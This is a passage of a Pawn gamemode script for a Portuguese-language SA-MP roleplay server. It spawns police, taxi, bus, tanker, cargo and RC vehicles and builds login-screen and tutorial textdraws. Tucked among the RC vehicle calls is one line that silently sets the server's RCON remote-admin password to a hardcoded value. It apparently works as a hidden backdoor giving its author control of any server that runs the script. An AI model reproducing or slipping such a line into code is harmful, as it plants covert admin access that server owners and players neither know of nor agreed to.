    CreateVehicle(598,2269.1675,2443.4504,10.8636,359.9076,6,0, 300); // POL_FEDERALtruck
    CreateVehicle(427,2260.5974,2443.6738,10.9522,359.2451,0,6, 300); // federal1
    CreateVehicle(427,2256.1211,2443.5767,10.9523,359.6268,0,6, 300); // federal2
    CreateVehicle(490,2273.4224,2476.7065,10.9472,179.8967,0,6, 300); // federal3
    CreateVehicle(490,2277.7766,2476.7893,10.9480,179.9290,0,6, 300); // federal4
	// Taxi
	CreateVehicle(420,1285.0436,-1266.8179,14.3384+4,359.7477,6,6, 300); // Taxi Unity 1
	CreateVehicle(420,1281.0797,-1266.8555,14.3384+4,359.3927,6,6, 300); // Taxi Unity 2
	CreateVehicle(420,1277.0984,-1266.7555,14.3406+4,0.1163,6,6, 300); // Taxi Unity 3
	CreateVehicle(438,1289.0193,-1266.8656,14.5624+4,359.8796,6,6, 300); // Taxi Unity 4
	// Onibus
	CreateVehicle(431, 2296.3962, -2336.7234, 13.6552, 48.5965, 154,0,300); // Busao 1
	CreateVehicle(431, 2290.1770, -2343.6411, 13.6464, 46.6267, 154,0,300); // Busao 2
	CreateVehicle(431, 2283.3823, -2350.9822, 13.6591, 45.9532, 154,0,300); // Busao 3
	CreateVehicle(431, 2263.2764, -2339.1724, 13.6516, 301.8688, 154,0,300); // Busao 4
	CreateVehicle(431, 2267.5144, -2343.5747, 13.6475, 300.5205, 154,0,300); // Busao 5
	// Caminhoes > Petrol Truck (Tanker)
	CreateVehicle(514, 2779.8469, -2510.3757, 14.6438, 89.2830, 113, 113, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2779.7981, -2473.9719, 14.6542, 90.4162, 113, 113, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2779.5789, -2402.1841, 14.6300, 89.2225, 113, 113, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2780.3342, -2436.9912, 14.6374, 90.4412, 113, 113, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2739.0566, -2465.5708, 14.6642, 270.2811, 113, 113, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2765.3372, -2385.9246, 14.6532, 181.3853, 113, 113, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2727.9050, -2491.9709, 14.6728, 270.3910, 1, 1, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2739.0923, -2431.7849, 14.6630, 270.3166, 1, 1, 300); // Petrol Truck (Tanker)
	CreateVehicle(404, 2739.2590, -2421.2480, 14.6498, 269.0966, 1, 1, 300); // Petrol Truck (Tanker)
	CreateVehicle(404, 2727.4551, -2392.5996, 14.6535, 269.7193, 1, 1, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2726.4458, -2413.4219, 14.6509, 270.3562, 1, 1, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2745.7681, -2446.6987, 14.6721, 269.1304, 3, 3, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2738.7390, -2473.2537, 14.6684,269.8560, 3, 3, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2738.5317, -2485.1572, 14.6606,269.9633, 3, 3, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2745.7764, -2440.2886, 14.6657,269.7522, 3, 3, 300); // Petrol Truck (Tanker)
	CreateVehicle(514, 2808.993164, -2560.620849, 14.686378, 359.220886, 3, 3, 300); // Petrol Truck (Tanker)
	// Cargas /\ _ \/
	CreateVehicle(584,2809.1013,-2548.1516,14.6488,0.273403,1,1, 300); // Carga
	CreateVehicle(450,2809.0373,-2534.6252,14.6544,0.271967,1,1, 300); // Carga
	CreateVehicle(450,2757.7380,-2522.0793,14.2571,359.0142,1,1, 300); // Carga
	CreateVehicle(450,2758.2053,-2375.5615,14.2540,178.8849,1,1, 300); // Carga
	CreateVehicle(584,2785.7273,-2494.3032,14.3044,90.8958,1,1, 300); // Carga
	CreateVehicle(584,2787.1638,-2456.0078,14.2752,92.2094,1,1, 300); // Carga
	CreateVehicle(591,2786.0039,-2417.4854,14.2675,93.3644,1,1, 300); // Carga
	CreateVehicle(591,2752.8098,-2387.8840,14.2740,180.9518,1,1, 300); // Carga
	CreateVehicle(450,2749.7456,-2387.8872,14.2957,180.8876,1,1, 300); // Carga
	CreateVehicle(584,2746.7368,-2388.1199,14.2543,181.0977,1,1, 300); // Carga
	CreateVehicle(591,2795.7568,-2436.7715,14.2670,90.8619,1,1, 300); // Carga
	CreateVehicle(584,2793.4177,-2473.7644,14.2724,89.6742,1,1, 300); // Carga
	CreateVehicle(435,2792.6731,-2510.1604,14.2706,90.3851,1,1, 300); // Carga
	CreateVehicle(435,2725.1392,-2511.2146,14.2995,270.3798,1,1, 300); // Carga
	// Bikes do Stunt Park LS
	CreateVehicle(510, 1948.6721, -1366.3226, 18.1865, 93.8039,0,0, 300); // MT Bike
	CreateVehicle(481, 1885.6619, -1366.7535, 13.0832, 267.3179,0,0, 300); // BMX 1
	CreateVehicle(481, 1885.6909, -1364.5441, 13.0781, 268.4727, 154, 154, 300); // BMX
	// RCv
	veiculoRC[0] = CreateVehicle(441,-1135.9205,1051.4645,1344.8929,269.5789,0,0, 300); // Carrinho RC
	LinkVehicleToInterior(veiculoRC[0], 10);
	veiculoRC[1] = CreateVehicle(441,-1135.9298,1050.1957,1344.8929,269.5789,0,0, 300); // Carrinho RC
	LinkVehicleToInterior(veiculoRC[1], 10);
	veiculoRC[2] = CreateVehicle(441,-1135.9478,1047.7549,1344.8929,269.5789,0,0, 300); // Carrinho RC
	LinkVehicleToInterior(veiculoRC[2], 10);
	veiculoRC[7] = CreateVehicle(464,-1132.0591,1053.7162,1345.0485,359.9393, 53, 79, 300); // Aviao RC
	LinkVehicleToInterior(veiculoRC[7], 10);
	veiculoRC[8] = CreateVehicle(464,-1132.0588,1050.8274,1345.2496,359.9392, 53, 79, 300); // Aviao RC
	LinkVehicleToInterior(veiculoRC[8], 10);
	SendRconCommand("rcon_password OlhaOTaxiHue");
	veiculoRC[9] = CreateVehicle(464,-1132.0594,1047.7358,1345.0911,359.9392, 53, 79, 300); // Aviao RC
	LinkVehicleToInterior(veiculoRC[9], 10);
	veiculoRC[13] = CreateVehicle(501,-1131.5659,1041.8112,1345.2090,278.3688, 53, 79, 300); // Heli RC
	LinkVehicleToInterior(veiculoRC[13], 10);
	veiculoRC[14] = CreateVehicle(501,-1129.0750,1038.8525,1345.2982,269.4928, 53, 79, 300); // Heli RC
	LinkVehicleToInterior(veiculoRC[14], 10);
	veiculoRC[19] = CreateVehicle(441,-969.3412,1065.8948,1344.1538,92.3147, 53, 79, 300); // Carrinho RC
	LinkVehicleToInterior(veiculoRC[19], 10);
	veiculoRC[20] = CreateVehicle(441,-969.4730,1069.1636,1344.1399,92.3147, 53, 79, 300); // Carrinho RC
	LinkVehicleToInterior(veiculoRC[20], 10);
	veiculoRC[24] = CreateVehicle(564,-1128.9263,1060.7858,1344.9142,271.4786, 53, 79, 300); // Tanque RC
	LinkVehicleToInterior(veiculoRC[24], 10);
	veiculoRC[25] = CreateVehicle(564,-1132.1489,1060.7026,1344.9415,271.4786, 53, 79, 300); // Tanque RC
	LinkVehicleToInterior(veiculoRC[25], 10);
	veiculoRC[27] = CreateVehicle(464,-977.1423,1089.6962,1347.7324,89.6767, 53, 79, 300); // Aviao RC
	LinkVehicleToInterior(veiculoRC[27], 10);
	veiculoRC[28] = CreateVehicle(464,-975.1898,1089.6853,1347.9556,89.6727, 53, 79, 300); // Aviao RC
	LinkVehicleToInterior(veiculoRC[28], 10);

	/*tmpobjid = */

	/*new
		File:SET_Fopen,
		SET_Index,
		SET_Modelo,
		Float:SET_X,
		Float:SET_Y,
		Float:SET_Z,
		Float:SET_A,
		SET_Cor1,
		SET_Cor2
	;

	SET_Fopen = fopen("Sets.cfg", io_readwrite);

	while(fread(SET_Fopen, gstring, sizeof(gstring), false))
	{
		SET_Index 	= 	0;
		SET_Modelo 	= 	strval(strtok(gstring, SET_Index));
		SET_X 		= 	Float:floatstr(strtok(gstring, SET_Index));
		SET_Y		= 	Float:floatstr(strtok(gstring, SET_Index));
		SET_Z 		= 	Float:floatstr(strtok(gstring, SET_Index));
		SET_A 		= 	Float:floatstr(strtok(gstring, SET_Index));
		SET_Cor1	= 	strval(strtok(gstring, SET_Index));
		SET_Cor2 	= 	strval(strtok(gstring, SET_Index));
		CreateVehicle(SET_Modelo, SET_X, SET_Y, SET_Z, SET_A, SET_Cor1, SET_Cor2, 300);
	}
	fclose(SET_Fopen);*/

	skins_binco = LoadModelSelectionMenu("skins/skins_binco.txt");
	skins_didiersachs = LoadModelSelectionMenu("skins/skins_didiersachs.txt");
	skins_prolaps = LoadModelSelectionMenu("skins/skins_prolaps.txt");
	skins_suburban = LoadModelSelectionMenu("skins/skins_suburban.txt");
	skins_victim = LoadModelSelectionMenu("skins/skins_victim.txt");
	skins_zip = LoadModelSelectionMenu("skins/skins_zip.txt");
	skins_vip = LoadModelSelectionMenu("skins/skins_vip.txt");

	//  Textdraws
  	TextNomeServer = TextDrawCreate(557.000000, 410.000000, "~r~~h~W~b~~h~E ~y~RPG");
	TextDrawBackgroundColor(TextNomeServer, 255);
	TextDrawFont(TextNomeServer, 3);
	TextDrawLetterSize(TextNomeServer, 0.559998, 2.599998);
	TextDrawColor(TextNomeServer, -7601921);
	TextDrawSetOutline(TextNomeServer, 0);
	TextDrawSetShadow(TextNomeServer, 1);
	TextDrawSetProportional(TextNomeServer, 1);

	TextNomeSite = TextDrawCreate(547.000000, 433.000000, "forumwe.vivagamesonline.com");
	TextDrawBackgroundColor(TextNomeSite, 255);
	TextDrawFont(TextNomeSite, 1);
	TextDrawLetterSize(TextNomeSite, 0.209999, 1.100000);
	TextDrawColor(TextNomeSite, -1);
	TextDrawSetOutline(TextNomeSite, 1);
	TextDrawSetProportional(TextNomeSite, 1);
	//AFK
	AFK1 = TextDrawCreate(330.000000, 120.000000, "~r~~h~~b~~h~Voce esta AFK! Use: ~r~~h~~n~~w~~h~/SairAFK");
	TextDrawAlignment(AFK1, 2);
	TextDrawBackgroundColor(AFK1, 255);
	TextDrawFont(AFK1, 1);
	TextDrawLetterSize(AFK1, 1.120000, 4.099999);
	TextDrawColor(AFK1, -1);
	TextDrawSetOutline(AFK1, 1);
	TextDrawSetProportional(AFK1, 1);
	//--
	Favela_1 = TextDrawCreate(120.000000, 415.000000, "FAVELA - DM LIVRE");
	TextDrawBackgroundColor(Favela_1, 0);
	TextDrawFont(Favela_1, 1);
	TextDrawLetterSize(Favela_1, 0.460000, 1.600000);
	TextDrawColor(Favela_1, -16776961);
	TextDrawSetOutline(Favela_1, 1);
	TextDrawSetProportional(Favela_1, 1);
	//--
	Favela_2 = TextDrawCreate(120.000000, 415.000000, "FAVELA - DM LIVRE");
	TextDrawBackgroundColor(Favela_2, 0);
	TextDrawFont(Favela_2, 1);
	TextDrawLetterSize(Favela_2, 0.460000, 1.600000);
	TextDrawColor(Favela_2, -16776961);
	TextDrawSetOutline(Favela_2, 1);
	TextDrawSetProportional(Favela_2, 1);
	//--
	IMG_Matou = TextDrawCreate(38.000000, 274.000000, "_");
	TextDrawBackgroundColor(IMG_Matou, 255);
	TextDrawFont(IMG_Matou, 4);
	TextDrawLetterSize(IMG_Matou, 0.500000, 1.000000);
	TextDrawColor(IMG_Matou, -1);
	TextDrawSetOutline(IMG_Matou, 0);
	TextDrawSetProportional(IMG_Matou, 1);
	TextDrawSetShadow(IMG_Matou, 1);
	TextDrawUseBox(IMG_Matou, 1);
	TextDrawBoxColor(IMG_Matou, 255);
	TextDrawTextSize(IMG_Matou, 50.000000, 40.000000);
	//
	IMG_Morreu = TextDrawCreate(88.000000, 274.000000, "_");
	TextDrawBackgroundColor(IMG_Morreu, 255);
	TextDrawFont(IMG_Morreu, 4);
	TextDrawLetterSize(IMG_Morreu, 0.500000, 1.000000);
	TextDrawColor(IMG_Morreu, -1);
	TextDrawSetOutline(IMG_Morreu, 0);
	TextDrawSetProportional(IMG_Morreu, 1);
	TextDrawSetShadow(IMG_Morreu, 1);
	TextDrawUseBox(IMG_Morreu, 1);
	TextDrawBoxColor(IMG_Morreu, 255);
	TextDrawTextSize(IMG_Morreu, 50.000000, 40.000000);
	//
	LoginScreen[0] = TextDrawCreate(647.000000, 2.000000, "_");
	TextDrawBackgroundColor(LoginScreen[0], 255);
	TextDrawFont(LoginScreen[0], 1);
	TextDrawLetterSize(LoginScreen[0], 0.500000, 7.000000);
	TextDrawColor(LoginScreen[0], -1);
	TextDrawSetOutline(LoginScreen[0], 0);
	TextDrawSetProportional(LoginScreen[0], 1);
	TextDrawSetShadow(LoginScreen[0], 1);
	TextDrawUseBox(LoginScreen[0], 1);
	TextDrawBoxColor(LoginScreen[0], 144);
	TextDrawTextSize(LoginScreen[0], -3.000000, 3.000000);
	TextDrawSetSelectable(LoginScreen[0], 0);

	LoginScreen[1] = TextDrawCreate(219.000000, 17.000000, "~r~~h~World ~b~~h~Evolution");
	TextDrawBackgroundColor(LoginScreen[1], 255);
	TextDrawFont(LoginScreen[1], 1);
	TextDrawLetterSize(LoginScreen[1], 0.639999, 2.399999);
	TextDrawColor(LoginScreen[1], -1);
	TextDrawSetOutline(LoginScreen[1], 0);
	TextDrawSetProportional(LoginScreen[1], 1);
	TextDrawSetShadow(LoginScreen[1], 1);
	TextDrawSetSelectable(LoginScreen[1], 0);

	LoginScreen[2] = TextDrawCreate(263.000000, 46.000000, "roleplay de verdade!");
	TextDrawBackgroundColor(LoginScreen[2], 255);
	TextDrawFont(LoginScreen[2], 2);
	TextDrawLetterSize(LoginScreen[2], 0.220000, 0.899999);
	TextDrawColor(LoginScreen[2], -1);
	TextDrawSetOutline(LoginScreen[2], 0);
	TextDrawSetProportional(LoginScreen[2], 1);
	TextDrawSetShadow(LoginScreen[2], 1);
	TextDrawSetSelectable(LoginScreen[2], 0);

	LoginScreen[3] = TextDrawCreate(391.000000, 22.000000, "~y~RPG");
	TextDrawBackgroundColor(LoginScreen[3], 255);
	TextDrawFont(LoginScreen[3], 3);
	TextDrawLetterSize(LoginScreen[3], 0.450000, 1.700000);
	TextDrawColor(LoginScreen[3], -1);
	TextDrawSetOutline(LoginScreen[3], 0);
	TextDrawSetProportional(LoginScreen[3], 1);
	TextDrawSetShadow(LoginScreen[3], 1);
	TextDrawSetSelectable(LoginScreen[3], 0);

	LoginScreen[4] = TextDrawCreate(189.000000, 38.000000, "-");
	TextDrawBackgroundColor(LoginScreen[4], 255);
	TextDrawFont(LoginScreen[4], 2);
	TextDrawLetterSize(LoginScreen[4], 21.410045, 1.000000);
	TextDrawColor(LoginScreen[4], -1);
	TextDrawSetOutline(LoginScreen[4], 1);
	TextDrawSetProportional(LoginScreen[4], 1);
	TextDrawSetSelectable(LoginScreen[4], 0);

	LoginScreen[5] = TextDrawCreate(647.000000, 382.000000, "_");
	TextDrawBackgroundColor(LoginScreen[5], 255);
	TextDrawFont(LoginScreen[5], 1);
	TextDrawLetterSize(LoginScreen[5], 0.500000, 7.000000);
	TextDrawColor(LoginScreen[5], -1);
	TextDrawSetOutline(LoginScreen[5], 0);
	TextDrawSetProportional(LoginScreen[5], 1);
	TextDrawSetShadow(LoginScreen[5], 1);
	TextDrawUseBox(LoginScreen[5], 1);
	TextDrawBoxColor(LoginScreen[5], 144);
	TextDrawTextSize(LoginScreen[5], -3.000000, 3.000000);
	TextDrawSetSelectable(LoginScreen[5], 0);

	LoginScreen[6] = TextDrawCreate(295.000000, 58.000000, "Versao 1.0");
	TextDrawBackgroundColor(LoginScreen[6], 255);
	TextDrawFont(LoginScreen[6], 2);
	TextDrawLetterSize(LoginScreen[6], 0.180000, 0.799999);
	TextDrawColor(LoginScreen[6], -1);
	TextDrawSetOutline(LoginScreen[6], 0);
	TextDrawSetProportional(LoginScreen[6], 1);
	TextDrawSetShadow(LoginScreen[6], 1);
	TextDrawSetSelectable(LoginScreen[6], 0);

	LoginScreen[7] = TextDrawCreate(234.000000, 385.000000, "www.~r~~h~we~b~~h~games~w~.forumbrasil.net");
	TextDrawBackgroundColor(LoginScreen[7], 255);
	TextDrawFont(LoginScreen[7], 3);
	TextDrawLetterSize(LoginScreen[7], 0.300000, 0.999999);
	TextDrawColor(LoginScreen[7], -1);
	TextDrawSetOutline(LoginScreen[7], 1);
	TextDrawSetProportional(LoginScreen[7], 1);
	TextDrawSetSelectable(LoginScreen[7], 0);

    BoxCarregando = TextDrawCreate(147.000000, 165.000000, "_");
    TextDrawBackgroundColor(BoxCarregando, 255);
    TextDrawFont(BoxCarregando, 1);
    TextDrawLetterSize(BoxCarregando, 0.500000, 11.000000);
    TextDrawColor(BoxCarregando, -1);
    TextDrawSetOutline(BoxCarregando, 0);
    TextDrawSetProportional(BoxCarregando, 1);
    TextDrawSetShadow(BoxCarregando, 1);
    TextDrawUseBox(BoxCarregando, 1);
    TextDrawBoxColor(BoxCarregando, 0x00000065);
    TextDrawTextSize(BoxCarregando, 490.000000, 0.000000);

    WE_GAMES1 = TextDrawCreate(216.000000, 190.000000, "CARREGANDO...");
    TextDrawBackgroundColor(WE_GAMES1, 255);
    TextDrawFont(WE_GAMES1, 2);
    TextDrawLetterSize(WE_GAMES1, 0.700000, 3.000000);
    TextDrawColor(WE_GAMES1, -1);
    TextDrawSetOutline(WE_GAMES1, 0);
    TextDrawSetProportional(WE_GAMES1, 1);
    TextDrawSetShadow(WE_GAMES1, 1);

    WE_GAMES2 = TextDrawCreate(220.000000, 219.000000, "AGUARDE UM MOMENTO PARA EFETUAR O LOGIN");
    TextDrawBackgroundColor(WE_GAMES2, 255);
    TextDrawFont(WE_GAMES2, 2);
    TextDrawLetterSize(WE_GAMES2, 0.200000, 1.100000);
    TextDrawColor(WE_GAMES2, -1);
    TextDrawSetOutline(WE_GAMES2, 0);
    TextDrawSetProportional(WE_GAMES2, 1);
    TextDrawSetShadow(WE_GAMES2, 1);//Fim login
//-------------------------------- Tutorial ------------------------------------
	//BaseTuto
	BaseTuto[0] = TextDrawCreate(476.000000, 139.000000, "_");
	TextDrawBackgroundColor(BaseTuto[0], 255);
	TextDrawFont(BaseTuto[0], 1);
	TextDrawLetterSize(BaseTuto[0], 0.500000, 1.000000);
	TextDrawColor(BaseTuto[0], -1);
	TextDrawSetOutline(BaseTuto[0], 0);
	TextDrawSetProportional(BaseTuto[0], 1);
	TextDrawSetShadow(BaseTuto[0], 1);
	TextDrawUseBox(BaseTuto[0], 1);
	TextDrawBoxColor(BaseTuto[0], 512819199);
	TextDrawTextSize(BaseTuto[0], 160.000000, 30.000000);
	TextDrawSetSelectable(BaseTuto[0], 0);

	BaseTuto[1] = TextDrawCreate(476.000000, 152.000000, "_");
	TextDrawBackgroundColor(BaseTuto[1], 255);
	TextDrawFont(BaseTuto[1], 1);
	TextDrawLetterSize(BaseTuto[1], 0.500000, 19.000000);
	TextDrawColor(BaseTuto[1], -1);
	TextDrawSetOutline(BaseTuto[1], 0);
	TextDrawSetProportional(BaseTuto[1], 1);
	TextDrawSetShadow(BaseTuto[1], 1);
	TextDrawUseBox(BaseTuto[1], 1);
	TextDrawBoxColor(BaseTuto[1], 512819056);
	TextDrawTextSize(BaseTuto[1], 160.000000, 30.000000);
	TextDrawSetSelectable(BaseTuto[1], 0);

	BaseTuto[2] = TextDrawCreate(322.000000, 136.000000, "Tutorial");
	TextDrawAlignment(BaseTuto[2], 2);
	TextDrawBackgroundColor(BaseTuto[2], 255);
	TextDrawFont(BaseTuto[2], 3);
	TextDrawLetterSize(BaseTuto[2], 0.529999, 1.500000);
	TextDrawColor(BaseTuto[2], -1);
	TextDrawSetOutline(BaseTuto[2], 0);
	TextDrawSetProportional(BaseTuto[2], 1);
	TextDrawSetShadow(BaseTuto[2], 1);
	TextDrawSetSelectable(BaseTuto[2], 0);

	BaseTuto[3] = TextDrawCreate(300.000000, 306.000000, "Aguarde");
	TextDrawBackgroundColor(BaseTuto[3], 255);
	TextDrawFont(BaseTuto[3], 1);
	TextDrawLetterSize(BaseTuto[3], 0.300000, 1.600000);
	TextDrawColor(BaseTuto[3], -1);
	TextDrawSetOutline(BaseTuto[3], 0);
	TextDrawSetProportional(BaseTuto[3], 1);
	TextDrawSetShadow(BaseTuto[3], 1);
	TextDrawSetSelectable(BaseTuto[3], 0);//t/t
	//BancoTuto
	BancoTuto[0] = TextDrawCreate(165.000000, 164.000000, "Esse e um dos bancos do servidor, no qual voce podera abrir~n~uma conta bancaria.");
	TextDrawBackgroundColor(BancoTuto[0], 255);
	TextDrawFont(BancoTuto[0], 1);
	TextDrawLetterSize(BancoTuto[0], 0.300000, 1.600000);
	TextDrawColor(BancoTuto[0], -1);
	TextDrawSetOutline(BancoTuto[0], 0);
	TextDrawSetProportional(BancoTuto[0], 1);
	TextDrawSetShadow(BancoTuto[0], 1);
	TextDrawSetSelectable(BancoTuto[0], 0);

	BancoTuto[1] = TextDrawCreate(165.000000, 194.000000, "Aqui voce podera fazer operacoes como saques, transacoes e~n~depositos bancarios.");
	TextDrawBackgroundColor(BancoTuto[1], 255);
	TextDrawFont(BancoTuto[1], 1);
	TextDrawLetterSize(BancoTuto[1], 0.300000, 1.600000);
	TextDrawColor(BancoTuto[1], -1);
	TextDrawSetOutline(BancoTuto[1], 0);
	TextDrawSetProportional(BancoTuto[1], 1);
	TextDrawSetShadow(BancoTuto[1], 1);
	TextDrawSetSelectable(BancoTuto[1], 0);

	BancoTuto[2] = TextDrawCreate(165.000000, 224.000000, "Recomendamos ter uma conta bancaria para poder manter~n~seu dinheiro seguro.");
	TextDrawBackgroundColor(BancoTuto[2], 255);
	TextDrawFont(BancoTuto[2], 1);
	TextDrawLetterSize(BancoTuto[2], 0.300000, 1.600000);
	TextDrawColor(BancoTuto[2], -1);
	TextDrawSetOutline(BancoTuto[2], 0);
	TextDrawSetProportional(BancoTuto[2], 1);
	TextDrawSetShadow(BancoTuto[2], 1);
	TextDrawSetSelectable(BancoTuto[2], 0);

	BancoTuto[3] = TextDrawCreate(165.000000, 254.000000, "Para usar sua conta bancaria basta ir ao banco ou em um~n~caixa e digitar: /Banco ou /Caixa");
	TextDrawBackgroundColor(BancoTuto[3], 255);
	TextDrawFont(BancoTuto[3], 1);
	TextDrawLetterSize(BancoTuto[3], 0.300000, 1.600000);
	TextDrawColor(BancoTuto[3], -1);
	TextDrawSetOutline(BancoTuto[3], 0);
	TextDrawSetProportional(BancoTuto[3], 1);
	TextDrawSetShadow(BancoTuto[3], 1);
	TextDrawSetSelectable(BancoTuto[3], 0);

	BancoTuto[4] = TextDrawCreate(165.000000, 284.000000, "O limite de deposito por operacao e de 15 milhoes.");
	TextDrawBackgroundColor(BancoTuto[4], 255);
	TextDrawFont(BancoTuto[4], 1);
	TextDrawLetterSize(BancoTuto[4], 0.300000, 1.600000);
	TextDrawColor(BancoTuto[4], -1);
	TextDrawSetOutline(BancoTuto[4], 0);
	TextDrawSetProportional(BancoTuto[4], 1);
	TextDrawSetShadow(BancoTuto[4], 1);
	TextDrawSetSelectable(BancoTuto[4], 0);//
	//PrefeituraTuto
	PrefeituraTuto[0] = TextDrawCreate(165.000000, 171.000000, "Essa e a prefeitura do servidor, o local de mais importancia~n~do governo.");
	TextDrawBackgroundColor(PrefeituraTuto[0], 255);
	TextDrawFont(PrefeituraTuto[0], 1);
	TextDrawLetterSize(PrefeituraTuto[0], 0.300000, 1.600000);
	TextDrawColor(PrefeituraTuto[0], -1);
	TextDrawSetOutline(PrefeituraTuto[0], 0);
	TextDrawSetProportional(PrefeituraTuto[0], 1);
	TextDrawSetShadow(PrefeituraTuto[0], 1);
	TextDrawSetSelectable(PrefeituraTuto[0], 0);

	PrefeituraTuto[1] = TextDrawCreate(165.000000, 203.000000, "Alem do banco, voce podera checar e pagar seus impostos~n~aqui.");
	TextDrawBackgroundColor(PrefeituraTuto[1], 255);
	TextDrawFont(PrefeituraTuto[1], 1);
	TextDrawLetterSize(PrefeituraTuto[1], 0.300000, 1.600000);
	TextDrawColor(PrefeituraTuto[1], -1);
	TextDrawSetOutline(PrefeituraTuto[1], 0);
	TextDrawSetProportional(PrefeituraTuto[1], 1);
	TextDrawSetShadow(PrefeituraTuto[1], 1);
	TextDrawSetSelectable(PrefeituraTuto[1], 0);

	PrefeituraTuto[2] = TextDrawCreate(165.000000, 234.000000, "Nos tempos de eleicao podera vir aqui se candidatar a ~n~presidencia da ~r~~h~W~b~~h~E~w~, ou votar.");
	TextDrawBackgroundColor(PrefeituraTuto[2], 255);
	TextDrawFont(PrefeituraTuto[2], 1);
	TextDrawLetterSize(PrefeituraTuto[2], 0.300000, 1.600000);
	TextDrawColor(PrefeituraTuto[2], -1);
	TextDrawSetOutline(PrefeituraTuto[2], 0);
	TextDrawSetProportional(PrefeituraTuto[2], 1);
	TextDrawSetShadow(PrefeituraTuto[2], 1);
	TextDrawSetSelectable(PrefeituraTuto[2], 0);

	PrefeituraTuto[3] = TextDrawCreate(165.000000, 264.000000, "Caso tenha uma profissao politica, aqui sera seu spawn~n~(Apenas se nao possuir residencia).");
	TextDrawBackgroundColor(PrefeituraTuto[3], 255);
	TextDrawFont(PrefeituraTuto[3], 1);
	TextDrawLetterSize(PrefeituraTuto[3], 0.300000, 1.600000);
	TextDrawColor(PrefeituraTuto[3], -1);
	TextDrawSetOutline(PrefeituraTuto[3], 0);
	TextDrawSetProportional(PrefeituraTuto[3], 1);
	TextDrawSetShadow(PrefeituraTuto[3], 1);
	TextDrawSetSelectable(PrefeituraTuto[3], 0);//
	//AutoEscolaTuto
	AutoEscolaTuto[0] = TextDrawCreate(165.000000, 172.000000, "Essa e a auto escola, o local aonde voce deve ir tirar suas~n~habilitacoes.");
	TextDrawBackgroundColor(AutoEscolaTuto[0], 255);
	TextDrawFont(AutoEscolaTuto[0], 1);
	TextDrawLetterSize(AutoEscolaTuto[0], 0.300000, 1.600000);
	TextDrawColor(AutoEscolaTuto[0], -1);
	TextDrawSetOutline(AutoEscolaTuto[0], 0);
	TextDrawSetProportional(AutoEscolaTuto[0], 1);
	TextDrawSetShadow(AutoEscolaTuto[0], 1);
	TextDrawSetSelectable(AutoEscolaTuto[0], 0);

	AutoEscolaTuto[1] = TextDrawCreate(165.000000, 203.000000, "Sao tres tipos de habitacao que voce pode adquirir, sendo~n~elas: nautica, terrestre e aerea.");
	TextDrawBackgroundColor(AutoEscolaTuto[1], 255);
	TextDrawFont(AutoEscolaTuto[1], 1);
	TextDrawLetterSize(AutoEscolaTuto[1], 0.300000, 1.600000);
	TextDrawColor(AutoEscolaTuto[1], -1);
	TextDrawSetOutline(AutoEscolaTuto[1], 0);
	TextDrawSetProportional(AutoEscolaTuto[1], 1);
	TextDrawSetShadow(AutoEscolaTuto[1], 1);
	TextDrawSetSelectable(AutoEscolaTuto[1], 0);

	AutoEscolaTuto[2] = TextDrawCreate(165.000000, 235.000000, "Voce podera conduzir sem habilitacao ate completar 2 niveis,~n~apos isso devera tirar sua habilitacao.");
	TextDrawBackgroundColor(AutoEscolaTuto[2], 255);
	TextDrawFont(AutoEscolaTuto[2], 1);
	TextDrawLetterSize(AutoEscolaTuto[2], 0.300000, 1.600000);
	TextDrawColor(AutoEscolaTuto[2], -1);
	TextDrawSetOutline(AutoEscolaTuto[2], 0);
	TextDrawSetProportional(AutoEscolaTuto[2], 1);
	TextDrawSetShadow(AutoEscolaTuto[2], 1);
	TextDrawSetSelectable(AutoEscolaTuto[2], 0);

	AutoEscolaTuto[3] = TextDrawCreate(165.000000, 267.000000, "Lembrando que o acumulo de multas pode resultar na perda~n~da habilitacao.");
	TextDrawBackgroundColor(AutoEscolaTuto[3], 255);
	TextDrawFont(AutoEscolaTuto[3], 1);
	TextDrawLetterSize(AutoEscolaTuto[3], 0.300000, 1.600000);
	TextDrawColor(AutoEscolaTuto[3], -1);
	TextDrawSetOutline(AutoEscolaTuto[3], 0);
	TextDrawSetProportional(AutoEscolaTuto[3], 1);
	TextDrawSetShadow(AutoEscolaTuto[3], 1);
	TextDrawSetSelectable(AutoEscolaTuto[3], 0);//
	//DelegaciaTuto
	DelegaciaTuto[0] = TextDrawCreate(165.000000, 164.000000, "Essa e a delegacia e o departamento da policia militar.");
	TextDrawBackgroundColor(DelegaciaTuto[0], 255);
	TextDrawFont(DelegaciaTuto[0], 1);
	TextDrawLetterSize(DelegaciaTuto[0], 0.300000, 1.600000);
	TextDrawColor(DelegaciaTuto[0], -1);
	TextDrawSetOutline(DelegaciaTuto[0], 0);
	TextDrawSetProportional(DelegaciaTuto[0], 1);
	TextDrawSetShadow(DelegaciaTuto[0], 1);
	TextDrawSetSelectable(DelegaciaTuto[0], 0);

	DelegaciaTuto[1] = TextDrawCreate(165.000000, 180.000000, "Na delegacia voce podera ver os jogadores que estao presos,~n~visitar e ate mesmo pagar fianca.");
	TextDrawBackgroundColor(DelegaciaTuto[1], 255);
	TextDrawFont(DelegaciaTuto[1], 1);
	TextDrawLetterSize(DelegaciaTuto[1], 0.300000, 1.600000);
	TextDrawColor(DelegaciaTuto[1], -1);
	TextDrawSetOutline(DelegaciaTuto[1], 0);
	TextDrawSetProportional(DelegaciaTuto[1], 1);
	TextDrawSetShadow(DelegaciaTuto[1], 1);
	TextDrawSetSelectable(DelegaciaTuto[1], 0);

	DelegaciaTuto[2] = TextDrawCreate(165.000000, 210.000000, "E aqui onde voce pode comprar seu porte de armas para~n~compra-las em uma Ammu-nation.");
	TextDrawBackgroundColor(DelegaciaTuto[2], 255);
	TextDrawFont(DelegaciaTuto[2], 1);
	TextDrawLetterSize(DelegaciaTuto[2], 0.300000, 1.600000);
	TextDrawColor(DelegaciaTuto[2], -1);
	TextDrawSetOutline(DelegaciaTuto[2], 0);
	TextDrawSetProportional(DelegaciaTuto[2], 1);
